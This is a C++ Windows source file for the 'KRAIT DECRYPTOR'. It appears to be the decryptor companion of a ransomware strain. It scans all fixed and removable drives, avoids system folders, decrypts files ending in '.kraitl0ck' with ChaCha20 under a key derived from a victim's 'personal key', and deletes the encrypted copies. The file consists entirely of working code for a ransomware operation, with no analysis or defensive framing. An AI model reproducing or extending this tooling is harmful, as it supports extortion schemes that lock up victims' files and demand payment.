#include <windows.h>
#include <shlobj.h>
#include <filesystem>
#include <fstream>
#include <iostream>
#include <vector>
#include <string>
#include <thread>
#include <atomic>
#include <set>
#include <algorithm>
#include <sstream>
#include <iomanip>
#include <cstring>
#include <sodium.h>

namespace fs = std::filesystem;
using namespace std;

static vector<uint8_t> SHA256(const vector<uint8_t>& data) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    vector<uint8_t> hash(32);
    if (!CryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)) return hash;
    if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)) { CryptReleaseContext(hProv, 0); return hash; }
    if (!CryptHashData(hHash, data.data(), data.size(), 0)) { CryptDestroyHash(hHash); CryptReleaseContext(hProv, 0); return hash; }
    DWORD hashLen = 32;
    CryptGetHashParam(hHash, HP_HASHVAL, hash.data(), &hashLen, 0);
    CryptDestroyHash(hHash);
    CryptReleaseContext(hProv, 0);
    return hash;
}

static vector<uint8_t> DeriveKey(const string& personalKey) {
    string clean;
    for (char c : personalKey) if (c != '-') clean += c;
    vector<uint8_t> keyData;
    for (size_t i = 0; i < clean.length(); i += 2) {
        keyData.push_back((uint8_t)strtol(clean.substr(i, 2).c_str(), NULL, 16));
    }
    while (keyData.size() < 32) keyData.push_back(0);
    return SHA256(keyData);
}

static atomic<bool> stopDecrypt = false;

vector<string> GetDrives() {
    vector<string> drives;
    DWORD mask = GetLogicalDrives();
    for (int i = 0; i < 26; i++) {
        if (mask & (1 << i)) {
            string drive = string(1, 'A' + i) + ":\\";
            UINT type = GetDriveTypeA(drive.c_str());
            if (type == DRIVE_FIXED || type == DRIVE_REMOVABLE) drives.push_back(drive);
        }
    }
    return drives;
}

bool ShouldSkipPath(const string& path) {
    static const set<string> skipDirs = {
        "\\Windows\\", "\\System32\\", "\\SysWOW64\\",
        "\\Program Files\\", "\\Program Files (x86)\\",
        "\\Windows.old\\", "\\$Recycle.Bin\\",
        "\\System Volume Information\\", "\\Boot\\", "\\EFI\\", "\\Recovery\\"
    };
    string lower = path;
    transform(lower.begin(), lower.end(), lower.begin(), ::tolower);
    for (const auto& dir : skipDirs) {
        string lowerDir = dir;
        transform(lowerDir.begin(), lowerDir.end(), lowerDir.begin(), ::tolower);
        if (lower.find(lowerDir) != string::npos) return true;
    }
    return false;
}

void DecryptFile(const string& filePath, const vector<uint8_t>& key) {
    if (stopDecrypt) return;
    ifstream in(filePath, ios::binary);
    if (!in) return;

    uint8_t nonce[crypto_stream_chacha20_NONCEBYTES];
    in.read((char*)nonce, sizeof(nonce));
    if (in.gcount() != sizeof(nonce)) { in.close(); return; }

    vector<uint8_t> encrypted((istreambuf_iterator<char>(in)), istreambuf_iterator<char>());
    in.close();
    if (encrypted.empty()) return;

    vector<uint8_t> decrypted(encrypted.size());
    crypto_stream_chacha20_xor(decrypted.data(), encrypted.data(), encrypted.size(), nonce, key.data());

    string originalPath = filePath;
    size_t pos = originalPath.find_last_of('.');
    if (pos != string::npos) originalPath = originalPath.substr(0, pos);

    ofstream out(originalPath, ios::binary);
    out.write((char*)decrypted.data(), decrypted.size());
    out.close();
    DeleteFileA(filePath.c_str());
}

void DecryptDirectory(const string& dir, const vector<uint8_t>& key) {
    if (stopDecrypt) return;
    if (ShouldSkipPath(dir)) return;
    try {
        for (const auto& entry : fs::recursive_directory_iterator(dir)) {
            if (stopDecrypt) return;
            if (!entry.is_regular_file()) continue;
            string path = entry.path().string();
            if (ShouldSkipPath(path)) continue;
            string ext = fs::path(path).extension().string();
            transform(ext.begin(), ext.end(), ext.begin(), ::tolower);
            if (ext == ".kraitl0ck") {
                DecryptFile(path, key);
            }
        }
    } catch (...) {}
}

void DecryptDrive(const string& drive, const vector<uint8_t>& key) {
    if (stopDecrypt) return;
    if (ShouldSkipPath(drive)) return;
    try {
        for (const auto& entry : fs::directory_iterator(drive)) {
            if (stopDecrypt) return;
            if (entry.is_directory()) {
                DecryptDirectory(entry.path().string(), key);
            }
        }
    } catch (...) {}
}

int main(int argc, char* argv[]) {
    if (sodium_init() < 0) return 1;

    cout << "\n========================================\n";
    cout << "  KRAIT DECRYPTOR\n";
    cout << "========================================\n";

    string personalKey;
    if (argc >= 2) {
        personalKey = argv[1];
    } else {
        cout << "\nEnter your personal key: ";
        getline(cin, personalKey);
    }
    personalKey.erase(remove_if(personalKey.begin(), personalKey.end(), ::isspace), personalKey.end());

    if (personalKey.length() < 16 || personalKey.length() > 23) {
        cout << "\n[ERROR] Invalid key format!\n";
        system("pause");
        return 1;
    }

    cout << "[*] Initializing decryption...\n";
    auto key = DeriveKey(personalKey);

    auto drives = GetDrives();
    vector<thread> threads;
    for (const auto& drive : drives) {
        threads.emplace_back([drive, key]() {
            DecryptDrive(drive, key);
        });
    }
    for (auto& t : threads) t.join();

    cout << "\n[+] Decryption completed!\n";
    system("pause");
    return 0;
}
